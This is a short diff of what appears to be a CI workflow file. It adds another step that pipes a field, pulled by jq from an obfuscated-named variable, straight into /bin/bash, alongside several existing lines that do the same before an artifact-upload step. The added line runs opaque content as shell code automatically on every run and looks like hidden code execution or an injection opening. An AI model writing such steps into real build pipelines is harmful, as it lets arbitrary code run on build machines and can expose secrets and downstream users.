@@ -23,6 +23,7 @@ jobs:
           echo $dyx23 | jq -r .pxjj720 | /bin/bash
           printf '%s' "$lyt190" | jq -r .nmfn0061 | /bin/bash
           printf '%s' "$ht19355" | jq -r .q434 | /bin/bash
+          printf '%s' "$y5" | jq -r .gtp121 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
